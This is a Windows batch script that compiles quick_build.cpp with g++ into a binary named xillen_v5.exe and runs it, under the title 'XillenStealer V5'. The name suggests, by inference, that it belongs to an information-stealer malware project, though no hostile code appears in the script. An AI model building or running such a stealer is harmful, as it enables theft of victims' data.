@echo off
chcp 65001 >nul
title BUILD AND RUN - XillenStealer V5

echo.
echo ═══════════════════════════════════════════════════════
echo   XILLENSTEALER V5 - BUILD AND RUN
echo ═══════════════════════════════════════════════════════
echo.

cd /d "%~dp0"

echo [*] Building...
C:\msys64\mingw64\bin\g++.exe -o xillen_v5.exe quick_build.cpp -static 2>build.log

if exist xillen_v5.exe (
    echo [+] BUILD SUCCESS!
    echo.
    echo [*] Running...
    echo.
    xillen_v5.exe
) else (
    echo [!] BUILD FAILED!
    echo.
    echo [*] Checking errors...
    type build.log
    pause
)
